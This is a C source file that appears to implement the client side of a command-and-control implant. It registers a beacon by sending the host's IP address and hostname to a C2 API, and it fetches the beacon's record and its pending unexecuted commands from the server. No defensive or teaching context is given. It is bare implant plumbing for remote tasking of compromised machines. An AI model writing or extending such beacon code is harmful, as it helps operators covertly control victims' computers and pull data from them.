#include "c2api.h"
#include "c2json.h"
#include "c2request.h"
#include <stdio.h>

int register_beacon(char* ip, char* hostname)
{
    char* data;
    asprintf(&data,
        "{\"ip\": \"%s\",\"hostname\": \"%s\"}",
        ip, hostname);
    char* response = request_post(C2_API_BEACON_REGISTER, data);
    int id = parse_int(response, "id");
    return id;
}

struct Beacon* get_beacon(int beacon_id)
{
    char* url;
    asprintf(&url, C2_API_BEACON, beacon_id);
    char* response = request_get(url);
    struct Beacon* beacon = parse_beacon(response);
    return beacon;
}

struct Command** get_beacon_commands(int beacon_id, bool unexec_only)
{
    char* url;
    if (unexec_only) {
        asprintf(&url, C2_API_BEACON_UNEXEC, beacon_id);
    } else {
        asprintf(&url, C2_API_BEACON_COMMANDS, beacon_id);
    }
    char* response = request_get(url);
    struct Command** commands = parse_commands(response);
    return commands;
}
